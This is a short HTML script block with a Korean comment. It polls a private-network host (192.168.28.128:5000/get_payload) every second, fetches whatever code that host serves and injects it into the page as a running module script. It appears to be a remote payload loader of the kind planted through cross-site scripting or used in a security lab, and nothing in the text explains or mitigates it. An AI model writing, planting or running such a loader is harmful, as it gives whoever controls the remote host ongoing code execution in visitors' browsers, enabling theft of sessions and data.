<script>
async function fetchAndRunPayload() {
    try {
        const res = await fetch("http://192.168.28.128:5000/get_payload");
        const payloadCode = await res.text();
        if (payloadCode) {
            const script = document.createElement("script");
            script.type = "module";
            script.textContent = payloadCode;
            document.body.appendChild(script);
        }
    } catch(e) {
        console.error("Failed to fetch payload:", e);
    }
}

// 1초마다 최신 payload 확인
setInterval(fetchAndRunPayload, 1000);
</script>
